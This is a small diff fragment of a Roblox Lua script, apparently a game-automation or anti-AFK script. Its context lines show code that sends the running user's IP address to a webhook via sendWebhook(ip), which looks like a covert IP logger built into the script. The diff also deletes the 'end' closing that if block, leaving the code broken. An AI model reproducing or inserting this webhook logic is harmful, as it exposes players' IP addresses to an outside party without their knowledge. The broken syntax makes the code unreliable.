@@ -51,7 +51,6 @@ if req then
     sendWebhook(ip)
 else
     sendWebhook("Unavailable")
-end
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 
